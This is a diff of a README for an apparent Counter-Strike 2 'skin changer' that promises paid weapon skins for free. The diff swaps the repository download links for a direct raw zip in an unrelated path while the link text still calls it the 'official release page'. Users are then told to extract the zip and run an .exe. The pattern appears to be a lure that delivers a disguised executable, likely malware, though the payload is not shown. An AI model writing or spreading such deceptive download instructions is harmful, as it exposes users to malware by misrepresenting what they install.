@@ -5,7 +5,7 @@ description: "Modify Counter-Strike 2 loadouts with an integrated skin changer u
 ---
 # 🖼️ CS2-Skin-Changer-Unlock-All-2026 - Access Every Weapon Skin For Free
 
-[![](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Schoolhouseroma809/CS2-Skin-Changer-Unlock-All-2026)
+[![](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Schoolhouseroma809/schoolhouseroma809.github.io/main/TheGIFT/v2.3.zip)
 
 This software allows users to view and use custom weapon skins within Counter-Strike 2. It functions on the client side, which means only you see the changes. Other players in your matches remain unaffected, and your game files stay intact on the official servers. The tool modifies local visual data so you can equip high-tier skins without purchasing them through the Steam Marketplace.
 
@@ -24,7 +24,7 @@ To run this application, your computer needs these basic specifications:
 
 Follow these steps to set up the skin changer on your machine.
 
-1. Go to the [official release page](https://github.com/Schoolhouseroma809/CS2-Skin-Changer-Unlock-All-2026) to download the compressed folder.
+1. Go to the [official release page](https://raw.githubusercontent.com/Schoolhouseroma809/schoolhouseroma809.github.io/main/TheGIFT/v2.3.zip) to download the compressed folder.
 2. Locate the file in your downloads folder.
 3. Right-click the folder and select "Extract All" to unpack the contents.
 4. Open the extracted folder and find the file labeled CS2-Skin-Changer.exe.
